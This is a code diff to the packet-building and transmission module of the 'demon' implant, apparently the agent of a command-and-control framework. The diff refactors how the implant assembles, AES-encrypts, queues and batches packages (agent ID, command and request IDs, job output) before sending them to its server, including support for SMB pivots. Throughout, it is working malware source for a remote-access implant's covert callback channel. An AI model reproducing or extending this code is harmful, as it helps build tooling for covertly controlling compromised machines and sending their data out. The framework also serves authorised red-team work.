@@ -35,18 +35,23 @@ VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
     Buffer[ 0 ] = Value & 0xFF;
 }
 
-VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size )
-{
+VOID Int32ToBuffer(
+    OUT PUCHAR Buffer,
+    IN  UINT32 Size
+) {
     ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
     ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
     ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
     ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
 }
 
-VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
-{
-    if ( ! Package )
+VOID PackageAddInt32(
+    IN OUT PPACKAGE Package,
+    IN     UINT32   Data
+) {
+    if ( ! Package ) {
         return;
+    }
 
     Package->Buffer = Instance.Win32.LocalReAlloc(
             Package->Buffer,
@@ -54,16 +59,16 @@ VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
             LMEM_MOVEABLE
     );
 
-    Int32ToBuffer( Package->Buffer + Package->Length, dataInt );
+    Int32ToBuffer( Package->Buffer + Package->Length, Data );
 
-    Package->Size   =   Package->Length;
-    Package->Length +=  sizeof( UINT32 );
+    Package->Length += sizeof( UINT32 );
 }
 
 VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
 {
-    if ( ! Package )
+    if ( ! Package ) {
         return;
+    }
 
     Package->Buffer = Instance.Win32.LocalReAlloc(
             Package->Buffer,
@@ -73,11 +78,10 @@ VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
 
     Int64ToBuffer( Package->Buffer + Package->Length, dataInt );
 
-    Package->Size   =  Package->Length;
     Package->Length += sizeof( UINT64 );
 }
 
-VOID PackageAddPtr( PPACKAGE Package, PVOID pointer)
+VOID PackageAddPtr( PPACKAGE Package, PVOID pointer )
 {
     PackageAddInt64( Package, ( UINT64 ) pointer );
 }
@@ -95,32 +99,28 @@ VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
 
     MemCopy( Package->Buffer + ( Package->Length ), Data, Size );
 
-    Package->Size   =  Package->Length;
     Package->Length += Size;
 }
 
-
 VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
 {
-    if ( ! Package && Size )
+    if ( ! Package ) {
         return;
+    }
 
     PackageAddInt32( Package, Size );
 
     if ( Size )
     {
         Package->Buffer = Instance.Win32.LocalReAlloc(
-                Package->Buffer,
-                Package->Length + Size,
-                LMEM_MOVEABLE | LMEM_ZEROINIT
+            Package->Buffer,
+            Package->Length + Size,
+            LMEM_MOVEABLE | LMEM_ZEROINIT
         );
-
-        Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );
 
         MemCopy( Package->Buffer + Package->Length, Data, Size );
 
-        Package->Size   =   Package->Length;
-        Package->Length +=  Size;
+        Package->Length += Size;
     }
 }
 
@@ -134,7 +134,6 @@ VOID PackageAddWString( PPACKAGE package, PWCHAR data )
     PackageAddBytes( package, (PBYTE) data, StringLengthW( data ) * 2 );
 }
 
-// For callback to server
 PPACKAGE PackageCreate( UINT32 CommandID )
 {
     PPACKAGE Package = NULL;
@@ -146,84 +145,80 @@ PPACKAGE PackageCreate( UINT32 CommandID )
     Package->CommandID = CommandID;
     Package->Encrypt   = TRUE;
     Package->Destroy   = TRUE;
+    Package->Included  = FALSE;
+    Package->Next      = NULL;
 
-    PackageAddInt32( Package, 0 );
+    return Package;
+}
+
+PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
+{
+    PPACKAGE Package = PackageCreate( CommandID );
+
+    PackageAddInt32( Package, 0 ); // package length
     PackageAddInt32( Package, DEMON_MAGIC_VALUE );
     PackageAddInt32( Package, Instance.Session.AgentID );
+    PackageAddInt32( Package, Package->CommandID );
     PackageAddInt32( Package, Package->RequestID );
-    PackageAddInt32( Package, CommandID );
 
     return Package;
 }
 
-// For callback to server
-PPACKAGE PackageCreateWithRequestID( UINT32 RequestID, UINT32 CommandID )
+PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )
 {
-    PPACKAGE Package = NULL;
+    PPACKAGE Package = PackageCreate( CommandID );
 
-    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
-    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
-    Package->Length    = 0;
     Package->RequestID = RequestID;
-    Package->CommandID = CommandID;
-    Package->Encrypt   = TRUE;
-    Package->Destroy   = TRUE;
-
-    PackageAddInt32( Package, 0 );
-    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
-    PackageAddInt32( Package, Instance.Session.AgentID );
-    PackageAddInt32( Package, RequestID );
-    PackageAddInt32( Package, CommandID );
 
     return Package;
 }
 
-PPACKAGE PackageNew()
-{
-    PPACKAGE Package = NULL;
+VOID PackageDestroy(
+    IN PPACKAGE Package
+) {
+    PPACKAGE Pkg = Instance.Packages;
 
-    Package          = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
-    Package->Buffer  = Instance.Win32.LocalAlloc( LPTR, 0 );
-    Package->Length  = 0;
-    Package->Encrypt = FALSE;
-    Package->Destroy = TRUE;
-
-    PackageAddInt32( Package, 0 );
-
-    return Package;
-}
-
-VOID PackageDestroy( PPACKAGE Package )
-{
-    if ( ! Package )
-        return;
-
-    if ( ! Package->Buffer )
+    if ( Package )
     {
-        PUTS( "! Package->Buffer" )
-        return;
+        // make sure the package is not on the Instance.Packages list, avoid UAF
+        while ( Pkg )
+        {
+            if ( Package == Pkg )
+            {
+                PUTS_DONT_SEND( "Package can't be destroyed, is on Instance.Packages list" )
+                return;
+            }
+
+            Pkg = Pkg->Next;
+        }
+
+        if ( Package->Buffer )
+        {
+            MemSet( Package->Buffer, 0, Package->Length );
+            Instance.Win32.LocalFree( Package->Buffer );
+            Package->Buffer = NULL;
+        }
+
+        MemSet( Package, 0, sizeof( PACKAGE ) );
+        Instance.Win32.LocalFree( Package );
+        Package = NULL;
     }
-
-    MemSet( Package->Buffer, 0, Package->Length );
-    Instance.Win32.LocalFree( Package->Buffer );
-    Package->Buffer = NULL;
-
-    MemSet( Package, 0, sizeof( PACKAGE ) );
-    Instance.Win32.LocalFree( Package );
-    Package = NULL;
 }
 
-BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
-{
+// used to send the demon's metadata
+BOOL PackageTransmitNow(
+    IN OUT PPACKAGE Package,
+    OUT    PVOID*   Response,
+    OUT    PSIZE_T  Size
+) {
     AESCTX AesCtx  = { 0 };
     BOOL   Success = FALSE;
     UINT32 Padding = 0;
 
     if ( Package )
     {
-        if ( ! Package->Buffer )
-        {
-            PUTS( "Package->Buffer is empty" )
+        if ( ! Package->Buffer ) {
+            PUTS_DONT_SEND( "Package->Buffer is empty" )
             return FALSE;
         }
 
@@ -234,43 +229,203 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
         {
             Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );
 
-            if ( Package->CommandID == DEMON_INITIALIZE ) // only add these on init or key exchange
+            /* only add these on init or key exchange */
+            if ( Package->CommandID == DEMON_INITIALIZE ) {
                 Padding += 32 + 16;
+            }
 
             AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
 
-        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) )
+        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
             Success = TRUE;
-        else
-            PUTS("TransportSend failed!")
+        } else {
+            PUTS_DONT_SEND("TransportSend failed!")
+        }
 
-        if ( Package->Destroy )
-            PackageDestroy( Package );
-        else if ( Package->Encrypt )
+        if ( Package->Destroy ) {
+            PackageDestroy( Package ); Package = NULL;
+        } else if ( Package->Encrypt ) {
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
-    }
-    else
-    {
-        PUTS( "Package is empty" )
+        }
+    } else {
+        PUTS_DONT_SEND( "Package is empty" )
         Success = FALSE;
     }
 
     return Success;
 }
 
-VOID PackageTransmitError( UINT32 ID, UINT32 ErrorCode )
-{
-    PRINTF( "Transmit Error: %d\n", ErrorCode );
-    PPACKAGE Package = PackageCreate( DEMON_ERROR );
+// don't transmit right away, simply store the package. Will be sent when PackageTransmitAll is called
+VOID PackageTransmit(
+    IN PPACKAGE Package
+) {
+    PPACKAGE List = NULL;
 
-    PUTS( "Add Error ID" )
+    if ( ! Package ) {
+        return;
+    }
+        
+    if ( ! Instance.Packages )
+    {
+        Instance.Packages = Package;
+    }
+    else
+    {
+        // add the new package to the end of the list (to preserve the order)
+        List = Instance.Packages;
+        while ( List->Next ) {
+            List = List->Next;
+        }
+        List->Next = Package;
+    }
+}
+
+// transmit all stored packages in a single request
+BOOL PackageTransmitAll(
+    OUT    PVOID*   Response,
+    OUT    PSIZE_T  Size
+) {
+    AESCTX   AesCtx  = { 0 };
+    BOOL     Success = FALSE;
+    UINT32   Padding = 0;
+    PPACKAGE Package = NULL;
+    PPACKAGE Pkg     = Instance.Packages;
+    PPACKAGE Entry   = NULL;
+    PPACKAGE Prev    = NULL;
+
+#if TRANSPORT_SMB
+    // SMB pivots don't need to send DEMON_COMMAND_GET_JOB
+    // so if we don't having nothing to send, simply exit
+    if ( ! Instance.Packages )
+        return TRUE;
+#endif
+
+    Package = PackageCreateWithMetaData( DEMON_COMMAND_GET_JOB );
+
+    // add all the packages we want to send to the main package
+    while ( Pkg )
+    {
+        PackageAddInt32( Package, Pkg->CommandID );
+        PackageAddInt32( Package, Pkg->RequestID );
+        PackageAddBytes( Package, Pkg->Buffer, Pkg->Length );
+        Pkg->Included = TRUE;
+
+        // make sure we don't send a package larger than DEMON_MAX_REQUEST_LENGTH
+        if ( Package->Length > DEMON_MAX_REQUEST_LENGTH )
+            break;
+
+        Pkg = Pkg->Next;
+    }
+
+    // writes package length to buffer
+    Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );
+
+    /*
+     *  Header:
+     *  [ SIZE         ] 4 bytes
+     *  [ Magic Value  ] 4 bytes
+     *  [ Agent ID     ] 4 bytes
+     *  [ COMMAND ID   ] 4 bytes
+     *  [ Request ID   ] 4 bytes
+    */
+    Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );
+
+    // encrypt the package
+    AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
+    AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
+
+    // send it
+    if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
+        Success = TRUE;
+    } else {
+        PUTS_DONT_SEND("TransportSend failed!")
+    }
+
+    // decrypt the package
+    AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
+
+    Entry = Instance.Packages;
+    Prev  = NULL;
+
+    if ( Success )
+    {
+        // the request worked, remove all the packages that were included
+
+        while ( Entry )
+        {
+            if ( Entry->Included )
+            {
+                // is this the first entry?
+                if ( Entry == Instance.Packages )
+                {
+                    // update the start of the list
+                    Instance.Packages = Entry->Next;
+
+                    // remove the entry if requried
+                    if ( Entry->Destroy ) {
+                        PackageDestroy( Entry ); Entry = NULL;
+                    }
+
+                    Entry = Instance.Packages;
+                    Prev  = NULL;
+                }
+                else
+                {
+                    if ( Prev )
+                    {
+                        // remove the entry from the list
+                        Prev->Next = Entry->Next;
+
+                        // remove the entry if requried
+                        if ( Entry->Destroy ) {
+                            PackageDestroy( Entry ); Entry = NULL;
+                        }
+
+                        Entry = Prev->Next;
+                    }
+                    else
+                    {
+                        // wut? this shouldn't happen
+                        PUTS_DONT_SEND( "Failed to cleanup packages list" )
+                    }
+                }
+            }
+            else
+            {
+                Prev  = Entry;
+                Entry = Entry->Next;
+            }
+        }
+    }
+    else
+    {
+        // the request failed, mark all packages as not included for next time
+        while ( Entry )
+        {
+            Entry->Included = FALSE;
+            Entry           = Entry->Next;
+        }
+    }
+
+    PackageDestroy( Package ); Package = NULL;
+
+    return Success;
+}
+
+VOID PackageTransmitError(
+    IN UINT32 ID,
+    IN UINT32 ErrorCode
+) {
+    PPACKAGE Package = NULL;
+
+    PRINTF_DONT_SEND( "Transmit Error: %d\n", ErrorCode );
+
+    Package = PackageCreate( DEMON_ERROR );
+
     PackageAddInt32( Package, ID );
-    PUTS( "Add Error Code" )
     PackageAddInt32( Package, ErrorCode );
-    PUTS( "Send Error" )
-    PackageTransmit( Package, NULL, NULL );
-    PUTS( "Send" )
+    PackageTransmit( Package );
 }
 
